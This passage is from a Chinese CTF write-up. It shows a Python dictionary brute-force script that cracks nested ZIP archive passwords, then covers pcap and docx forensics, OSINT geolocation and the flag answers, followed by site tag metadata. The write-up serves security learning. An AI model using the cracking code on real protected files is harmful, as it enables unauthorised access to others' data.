返回解压出的文件名列表 except (RuntimeError, zipfile.BadZipFile, zlib.error): continue print(&quot;[-] 未找到密码，请尝试其他字典或方法。&quot;) return None except FileNotFoundError: print(&quot;[!] 文件未找到，请检查路径是否正确。&quot;) return None except zlib.error: print(&quot;[!] 遇到 zlib 解压错误，终止爆破。&quot;) return None# 递归解压直到没有更多 zip 文件def recursive_brute_force(zip_path, dict_path): try: while zip_path: extracted_files = brute_force_zip(zip_path, dict_path) if not extracted_files: break # 查找新的 ZIP 文件 new_zip_path = None for file in extracted_files: if file.endswith(&quot;.zip&quot;): new_zip_path = file break if new_zip_path: zip_path = new_zip_path # 直接使用新找到的 ZIP 文件 else: print(&quot;[!] 没有找到更多的 ZIP 文件，任务完成！&quot;) break except zlib.error: print(&quot;[!] 发生 zlib 错误，终止爆破。&quot;) finally: # 将所有找到的密码写入文件 with open(&quot;found_passwords.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: for password in passwords: f.write(password + &quot;\\n&quot;)# 运行爆破函数recursive_brute_force(zip_path, dict_path)print(&quot;所有找到的密码:&quot;, passwords) 注意，爆破到dwarf_vault_1.zip经常会返回奇怪的ERROR，所以这里的代码逻辑最好是在遇到意外ERROR时直接终止爆破并将现有的所有密码先写进txt文件，不然容易卡在这里重复很多次。 再成功解压dwarf_vault_1.zip后，我们会得到2份文件：drop_pod.py以及mining_report.txt。 txt文件的内容为： 1Mining report - flag coordinates: ectf&#123;[[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]&#125; 用coordinate将flag表示了出来。于是来检查drop_pod.py的内容： 12345678910111213141516171819202122232425262728293031323334#Maybe the flag was the friends we made along the waypassword = &quot; &quot;flag = &quot;FAKE FLAG THIS IS NOT REAL&quot;def find_positions(flag, crew_list): positions = [] for char in flag: if char == &quot;_&quot;: positions.append(&quot;_&quot;) continue found = False for i, name in enumerate(crew_list): if char.lower() in name.lower(): positions.append([i, name.lower().index(char.lower())]) found = True break if not found: positions.append([None, None]) return positionspositions = find_positions(flag, password.split())output_text = &quot;Mining report - flag coordinates: ectf&#123;&quot; + str(positions) + &quot;&#125;&quot;with open(&quot;mining_report.txt&quot;, &quot;w&quot;) as file: file.write(output_text)print(&quot;Rock and Stone! Report written to mining_report.txt:&quot;, output_text) 是这段坐标的生成逻辑。所以可以编写一段代码，靠我们刚才保存的所有压缩密码来还原flag： 123456789101112131415161718192021222324252627with open(&quot;found_passwords.txt&quot;, &quot;r&quot;) as file: reversed_passwords = file.readlines()# 去除换行符并反转列表（因为我们爆破时是从200开始的，所以这里需要反过来）password_list = [line.strip() for line in reversed_passwords][::-1]#txt里的内容positions = [[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]# 还原 flagflag = &quot;&quot;for pos in positions: if pos == &quot;_&quot;: flag += &quot;_&quot; else: i, j = pos if 0 &lt;= i &lt; len(password_list) and 0 &lt;= j &lt; len(password_list[i]): flag += password_list[i][j] else: flag += &quot;?&quot; # 标记错误或缺失数据# 输出结果print(&quot;flag:&quot;, &quot;ectf&#123;&quot; + flag + &quot;&#125;&quot;)# flag: ectf&#123;d1ggy_d1ggy_h0l3&#125; 5. ForensicMy dearest 我们会得到一份docx文件，也就是word文件。打开后在信息的作者处即可找到文件作者： 根据题目要求，flag为： 1ectf&#123;MichelTeller&#125; Capture the hidden 这道题我们会得到一份.pcap文件，用Wireshark打开它。 由于是要找一份文件，我们先点击“文件” -&gt; “导出对象” -&gt; “HTTP”： 确实发现了一份上传的文件。可以点击保存它，但是打开会发现内容不不完整： 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1N 于是我们找这份文件在纪录里的具体位置： 可以看到我们保存的upload的文件内容只有蓝色部分，当我们将后续的内容也提出来，便会得到完整的flag： 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5EfQ==-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1ND&#125; Just a PCAP 这道题也是一份pcap文件，再次用Wireshark打开。 但是用之前的操作：“文件” -&gt; “导出对象” -&gt; “HTTP”，并不会发现任何东西。（实际上是因为这段纪录里并没有任何HTTP传输的内容。） 这时我们仔细观察第一条纪录的info会发现它是以”89504E47“，这是非常典型的PNG文件的文件头（因为它对应ASCII字符“‰PNG”），所以我们猜测这些纪录的info内容可以拼成一份完整的PNG文件。我们用这段代码将所有纪录的info内容提取出来并且保存成.png：（这段代码能运行的前提条件是下载了Wireshark\\的tshark.exe 123456789101112131415import pysharkimport pyshark.packetfrom binascii import unhexlifycapture = pyshark.FileCapture(&#x27;justapcap.pcap&#x27;, tshark_path=&#x27;D:\\\\Program Files\\\\Wireshark\\\\tshark.exe&#x27;) # 将这个路径替换成自己电脑上tshark.exe的路径hexstr = &quot;&quot;cnt = 0for packet in capture: s = str(packet) cur = s.split(&quot;Name:&quot;)[-1].split(&quot;.&quot;)[0].split(&quot;1m &quot;)[1] hexstr += curhexstr = hexstr.split(&quot;exam&quot;)[0]with open(&quot;a.png&quot;,&quot;wb&quot;) as f: f.write(unhexlify(hexstr)) 然后就会得到这张图片： 1ectf&#123;DN5_3xf1ltr@t10n_15_flnd3d&#125; 6. OsintProject-153-Q1 这道题我们会得到这张图片： 通过谷歌识图可以很轻易地知道这个地方是：Falls Caramy, 法语原名为Chutes_du_Caramy。 得到flag： 1ectf&#123;Chutes_du_Caramy&#125; Project-153-Q2 这道题我们会得到这张图片： 通过谷歌识图可以判断出来这张照片是在 Massif de l’Esterel 附近拍摄的。 但由于题目要求的是拍摄时所处的具体位置，所以我们还需要找些其他的线索。 注意到图片远处这里，有一座全是房子的半岛： 于是我们打开Google Earth，查看Massif de l’Esterel附近的海岸线。可以发现这个地方非常想图中的半岛： 并且点开 Calanque de l’Esterel, 83700 Saint-Raphaël, 法国 的相册可以看到这样一张图片： 跟我们图片里的一模一样。沿着这个方向依次尝试带有名字的地点，便可以成功找到拍摄地：Pointe de l’Observatoire, D559, 83700 Saint-Raphaël, 法国。 1ectf&#123;Pointe_de_l&#x27;Observatoire&#125; Project-153-Q3 这道题我们会得到这张图片： 再次通过谷歌识图可以发现图片所在地是 Rocher de Roquebrune： 在Google Earth找到这里 便可以在相册里发现这张图片，大概率是题目所指的“monster： 所以答案为左下角的作者名字。 1ectf&#123;Michael_DELAETER&#125; Project-153-Q4 首先通过谷歌识图判断出照片所在地应该是：Bormes-les-Mimosas 在Google Earth找到这里： 根据照片拍摄角度以及题目描述不难猜出远处的那座岛应该是 Île du Levant。 1ectf&#123;Île_du_Levant&#125; Project-153-Q5 这道题我们会得到这张图片： /OSINT_1_-_question-5/PANO_20220408_134922.jpg) 这道题会碰到一个非常有意思的事情。我们拿到的图片的文件大小为29.8 MB，而谷歌识图的上限为20MB，所以我们首先需要压缩一下图片的大小才能使用谷歌识图。我这里是用微信来进行有损压缩的。 然后便可以用谷歌识图来确认地点： 1ectf&#123;Gros_Cerveau&#125; (在法语中，“le” 是阳性单数定冠词，所以不包含在答案内。) Project-153-Q6 这道题我们会得到这张图片： 再次通过谷歌识图我们可以找到这样一条Instergram： （为了防止侵犯个人隐私我给图片打了个码。） 于是可以得知这张照片的拍摄所在地为 Moustiers-Sainte-Marie （zipcode：04360）。 至于台阶数可以直接利用开了联网功能的ChatGPT所搜即可： 最后的flag为： 1ectf&#123;262_04360&#125; PNJ - 3 - Gouzou 这道题我们会得到一个文件夹，里面有非常多的文件，它说的这个“the”属实是有点意义不明，所以我们先去搜索看一下GOUZOU是什么： 发现是法国艺术家JACE创作一个没有五官的诙谐卡通形象。根据这条线索我们可以锁定这张图片（也就是说我们需要找的应该是这张图片的具体位置）： 根据谷歌识图可以发现这张照片在 “Île de Ré”（雷岛）： 通过搜索“île de ré gouzou”可以找到这个网页：https://www.realahune.fr/les-murs-dexpression-de-latlantique/，并且发现： 于是我们确定这幅画是在”la digue du Boutillon, île de Ré”(是一座防波堤)，得到flag： 1ectf&#123;digue_du_boutillon&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"比赛Writeup","slug":"CTF/比赛Writeup","permalink":"https://archer-baiyi.github.io/en/categories/CTF/%E6%AF%94%E8%B5%9BWriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/en/tags/writeup/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"General","slug":"CTF/General","permalink":"https://archer-baiyi.github.io/en/categories/CTF/General/"},{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM-info-课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"机器学习 Machine Learning","slug":"TUM-info-课程笔记/机器学习-Machine-Learning","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-Machine-Learning/"},{"name":"服务器","slug":"CTF/服务器","permalink":"https://archer-baiyi.github.io/en/categories/CTF/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/en/categories/%E7%BC%96%E7%A8%8B/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"},{"name":"比赛Writeup","slug":"CTF/比赛Writeup","permalink":"https://archer-baiyi.github.io/en/categories/CTF/%E6%AF%94%E8%B5%9BWriteup/"},{"name":"TUM 数学 笔记","slug":"TUM-数学-笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"概率/统计 Probability & Statistics","slug":"TUM-数学-笔记/概率-统计-Probability-Statistics","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87-%E7%BB%9F%E8%AE%A1-Probability-Statistics/"},{"name":"Data Engeneering","slug":"TUM-info-课程笔记/Data-Engeneering","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Data-Engeneering/"},{"name":"杂","slug":"杂","permalink":"https://archer-baiyi.github.io/en/categories/%E6%9D%82/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"},{"name":"Stochastic Analysis 随机分析","slug":"TUM-数学-笔记/Stochastic-Analysis-随机分析","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/Stochastic-Analysis-%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/"},{"name":"P-adic Numbers and Hensels Lemma","slug":"TUM-数学-笔记/P-adic-Numbers-and-Hensels-Lemma","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/P-adic-Numbers-and-Hensels-Lemma/"},{"name":"Coding Theory 编码理论","slug":"TUM-数学-笔记/Coding-Theory-编码理论","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/Coding-Theory-%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/en/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"},{"name":"Theoretische Informatik 理论信息学","slug":"TUM-info-课程笔记/Theoretische-Informatik-理论信息学","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Theoretische-Informatik-%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Misc/"},{"name":"密码学 Kryptografie","slug":"TUM-info-课程笔记/密码学-Kryptografie","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6-Kryptografie/"},{"name":"量子计算 Quantum Computing","slug":"TUM-info-课程笔记/量子计算-Quantum-Computing","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97-Quantum-Computing/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Reverse Engineering","slug":"CTF/Reverse-Engineering","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Reverse-Engineering/"},{"name":"Dantenbank 数据库","slug":"TUM-info-课程笔记/Dantenbank-数据库","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://archer-baiyi.github.io/en/tags/ctf/"},{"name":"机器学习","slug":"机器学习","permalink":"https://archer-baiyi.github.io/en/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://archer-baiyi.github.io/en/tags/Machine-Learning/"},{"name":"server","slug":"server","permalink":"https://archer-baiyi.github.io/en/tags/server/"},{"name":"pandas","slug":"pandas","permalink":"https://archer-baiyi.github.io/en/tags/pandas/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/en/tags/SQL/"},{"name":"LWE","slug":"LWE","permalink":"https://archer-baiyi.github.io/en/tags/LWE/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/en/tags/sage/"},{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/en/tags/writeup/"},{"name":"lattice","slug":"lattice","permalink":"https://archer-baiyi.github.io/en/tags/lattice/"},{"name":"numpy","slug":"numpy","permalink":"https://archer-baiyi.github.io/en/tags/numpy/"},{"name":"rsa","slug":"rsa","permalink":"https://archer-baiyi.github.io/en/tags/rsa/"},{"name":"统计","slug":"统计","permalink":"https://archer-baiyi.github.io/en/tags/%E7%BB%9F%E8%AE%A1/"},{"name":"Statistics","slug":"Statistics","permalink":"https://archer-baiyi.github.io/en/tags/Statistics/"},{"name":"Python","slug":"Python","permalink":"https://archer-baiyi.github.io/en/tags/Python/"},{"name":"Numpy","slug":"Numpy","permalink":"https://archer-baiyi.github.io/en/tags/Numpy/"},{"name":"Data Engeneering","slug":"Data-Engeneering","permalink":"https://archer-baiyi.github.io/en/tags/Data-Engeneering/"},{"name":"bash","slug":"bash","permalink":"https://archer-baiyi.github.io/en/tags/bash/"},{"name":"GNU Coreutils","slug":"GNU-Coreutils","permalink":"https://archer-baiyi.github.io/en/tags/GNU-Coreutils/"},{"name":"德语，医药","slug":"德语，医药","permalink":"https://archer-baiyi.github.io/en/tags/%E5%BE%B7%E8%AF%AD%EF%BC%8C%E5%8C%BB%E8%8D%AF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://archer-baiyi.github.io/en/tags/ctfshow/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"},{"name":"Java","slug":"Java","permalink":"https://archer-baiyi.github.io/en/tags/Java/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/en/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/en/tags/HTB/"},{"name":"Stochastic Analysis","slug":"Stochastic-Analysis","permalink":"https://archer-baiyi.github.io/en/tags/Stochastic-Analysis/"},{"name":"随机分析","slug":"随机分析","permalink":"https://archer-baiyi.github.io/en/tags/%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/"},{"name":"ctfd","slug":"ctfd","permalink":"https://archer-baiyi.github.io/en/tags/ctfd/"},{"name":"p进数","slug":"p进数","permalink":"https://archer-baiyi.github.io/en/tags/p%E8%BF%9B%E6%95%B0/"},{"name":"P-adic Numbers","slug":"P-adic-Numbers","permalink":"https://archer-baiyi.github.io/en/tags/P-adic-Numbers/"},{"name":"Hensel's Lemma","slug":"Hensel-s-Lemma","permalink":"https://archer-baiyi.github.io/en/tags/Hensel-s-Lemma/"},{"name":"零知识证明","slug":"零知识证明","permalink":"https://archer-baiyi.github.io/en/tags/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"name":"Zero-knowledge proof","slug":"Zero-knowledge-proof","permalink":"https://archer-baiyi.github.io/en/tags/Zero-knowledge-proof/"},{"name":"ZKP","slug":"ZKP","permalink":"https://archer-baiyi.github.io/en/tags/ZKP/"},{"name":"华为","slug":"华为","permalink":"https://archer-baiyi.github.io/en/tags/%E5%8D%8E%E4%B8%BA/"},{"name":"面试","slug":"面试","permalink":"https://archer-baiyi.github.io/en/tags/%E9%9D%A2%E8%AF%95/"},{"name":"编码理论","slug":"编码理论","permalink":"https://archer-baiyi.github.io/en/tags/%E7%BC%96%E7%A0%81%E7%90%86%E8%AE%BA/"},{"name":"Coding Theory","slug":"Coding-Theory","permalink":"https://archer-baiyi.github.io/en/tags/Coding-Theory/"},{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/en/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/en/tags/Cryptohack/"},{"name":"Lattices","slug":"Lattices","permalink":"https://archer-baiyi.github.io/en/tags/Lattices/"},{"name":"LWE(Learning With Error)","slug":"LWE-Learning-With-Error","permalink":"https://archer-baiyi.github.io/en/tags/LWE-Learning-With-Error/"},{"name":"概率论","slug":"概率论","permalink":"https://archer-baiyi.github.io/en/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/en/tags/Probability-Theory/"},{"name":"distribution","slug":"distribution","permalink":"https://archer-baiyi.github.io/en/tags/distribution/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/en/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/en/tags/Codeforce/"},{"name":"Zero-knowledge proofs","slug":"Zero-knowledge-proofs","permalink":"https://archer-baiyi.github.io/en/tags/Zero-knowledge-proofs/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/en/tags/Injection/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/en/tags/JavaScript/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/en/tags/PHP/"},{"name":"eval()","slug":"eval","permalink":"https://archer-baiyi.github.io/en/tags/eval/"},{"name":"Ocaml","slug":"Ocaml","permalink":"https://archer-baiyi.github.io/en/tags/Ocaml/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://archer-baiyi.github.io/en/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"Format String","slug":"Format-String","permalink":"https://archer-baiyi.github.io/en/tags/Format-String/"},{"name":"C","slug":"C","permalink":"https://archer-baiyi.github.io/en/tags/C/"},{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/tags/CTF/"},{"name":"tool","slug":"tool","permalink":"https://archer-baiyi.github.io/en/tags/tool/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/en/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/en/tags/Hash/"},{"name":"python","slug":"python","permalink":"https://archer-baiyi.github.io/en/tags/python/"},{"name":"decode","slug":"decode","permalink":"https://archer-baiyi.github.io/en/tags/decode/"},{"name":"解码","slug":"解码","permalink":"https://archer-baiyi.github.io/en/tags/%E8%A7%A3%E7%A0%81/"},{"name":"base 64","slug":"base-64","permalink":"https://archer-baiyi.github.io/en/tags/base-64/"},{"name":"Theoretische Informatik","slug":"Theoretische-Informatik","permalink":"https://archer-baiyi.github.io/en/tags/Theoretische-Informatik/"},{"name":"理论信息学","slug":"理论信息学","permalink":"https://archer-baiyi.github.io/en/tags/%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"},{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/en/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/en/tags/esolang/"},{"name":"Malbolge","slug":"Malbolge","permalink":"https://archer-baiyi.github.io/en/tags/Malbolge/"},{"name":"密码学","slug":"密码学","permalink":"https://archer-baiyi.github.io/en/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"Quantum Computing","slug":"Quantum-Computing","permalink":"https://archer-baiyi.github.io/en/tags/Quantum-Computing/"},{"name":"量子计算","slug":"量子计算","permalink":"https://archer-baiyi.github.io/en/tags/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97/"},{"name":"AES","slug":"AES","permalink":"https://archer-baiyi.github.io/en/tags/AES/"},{"name":"ECB","slug":"ECB","permalink":"https://archer-baiyi.github.io/en/tags/ECB/"},{"name":"CBC","slug":"CBC","permalink":"https://archer-baiyi.github.io/en/tags/CBC/"},{"name":"CTR","slug":"CTR","permalink":"https://archer-baiyi.github.io/en/tags/CTR/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/en/tags/1000/"},{"name":"binary","slug":"binary","permalink":"https://archer-baiyi.github.io/en/tags/binary/"},{"name":"RSA","slug":"RSA","permalink":"https://archer-baiyi.github.io/en/tags/RSA/"},{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/en/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/en/tags/Operating-System/"},{"name":"进程","slug":"进程","permalink":"https://archer-baiyi.github.io/en/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"线程","slug":"线程","permalink":"https://archer-baiyi.github.io/en/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"Mutex","slug":"Mutex","permalink":"https://archer-baiyi.github.io/en/tags/Mutex/"},{"name":"Semaphore","slug":"Semaphore","permalink":"https://archer-baiyi.github.io/en/tags/Semaphore/"},{"name":"Petri-Netz","slug":"Petri-Netz","permalink":"https://archer-baiyi.github.io/en/tags/Petri-Netz/"},{"name":"synchron","slug":"synchron","permalink":"https://archer-baiyi.github.io/en/tags/synchron/"},{"name":"asynchron","slug":"asynchron","permalink":"https://archer-baiyi.github.io/en/tags/asynchron/"},{"name":"signal","slug":"signal","permalink":"https://archer-baiyi.github.io/en/tags/signal/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/en/tags/%E6%B3%A8%E5%85%A5/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://archer-baiyi.github.io/en/tags/MongoDB/"},{"name":"switch","slug":"switch","permalink":"https://archer-baiyi.github.io/en/tags/switch/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/en/tags/XSS/"},{"name":"html","slug":"html","permalink":"https://archer-baiyi.github.io/en/tags/html/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/en/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"内存管理","slug":"内存管理","permalink":"https://archer-baiyi.github.io/en/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"Paging","slug":"Paging","permalink":"https://archer-baiyi.github.io/en/tags/Paging/"},{"name":"Page table","slug":"Page-table","permalink":"https://archer-baiyi.github.io/en/tags/Page-table/"},{"name":"Ersetztungsstrategie","slug":"Ersetztungsstrategie","permalink":"https://archer-baiyi.github.io/en/tags/Ersetztungsstrategie/"},{"name":"RCE","slug":"RCE","permalink":"https://archer-baiyi.github.io/en/tags/RCE/"},{"name":"JWT","slug":"JWT","permalink":"https://archer-baiyi.github.io/en/tags/JWT/"},{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/en/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/en/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"逻辑电路图","slug":"逻辑电路图","permalink":"https://archer-baiyi.github.io/en/tags/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/"},{"name":"逻辑门","slug":"逻辑门","permalink":"https://archer-baiyi.github.io/en/tags/%E9%80%BB%E8%BE%91%E9%97%A8/"},{"name":"wsl","slug":"wsl","permalink":"https://archer-baiyi.github.io/en/tags/wsl/"},{"name":"vscode","slug":"vscode","permalink":"https://archer-baiyi.github.io/en/tags/vscode/"},{"name":"kali","slug":"kali","permalink":"https://archer-baiyi.github.io/en/tags/kali/"},{"name":"Miniforge","slug":"Miniforge","permalink":"https://archer-baiyi.github.io/en/tags/Miniforge/"},{"name":"Cookie","slug":"Cookie","permalink":"https://archer-baiyi.github.io/en/tags/Cookie/"},{"name":"PEM","slug":"PEM","permalink":"https://archer-baiyi.github.io/en/tags/PEM/"},{"name":"CRT","slug":"CRT","permalink":"https://archer-baiyi.github.io/en/tags/CRT/"},{"name":"Piet","slug":"Piet","permalink":"https://archer-baiyi.github.io/en/tags/Piet/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"https://archer-baiyi.github.io/en/tags/SQL-Injection/"},{"name":"PHP 代码注入","slug":"PHP-代码注入","permalink":"https://archer-baiyi.github.io/en/tags/PHP-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"},{"name":"greedy","slug":"greedy","permalink":"https://archer-baiyi.github.io/en/tags/greedy/"},{"name":"sortings","slug":"sortings","permalink":"https://archer-baiyi.github.io/en/tags/sortings/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/en/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/en/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Jinja2","slug":"Jinja2","permalink":"https://archer-baiyi.github.io/en/tags/Jinja2/"},{"name":"Mako","slug":"Mako","permalink":"https://archer-baiyi.github.io/en/tags/Mako/"},{"name":"C++","slug":"C","permalink":"https://archer-baiyi.github.io/en/tags/C/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/en/tags/800/"},{"name":"文件系统","slug":"文件系统","permalink":"https://archer-baiyi.github.io/en/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"输入/输出","slug":"输入-输出","permalink":"https://archer-baiyi.github.io/en/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"},{"name":"汇编语言","slug":"汇编语言","permalink":"https://archer-baiyi.github.io/en/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://archer-baiyi.github.io/en/tags/RISC-V/"},{"name":"Reverse 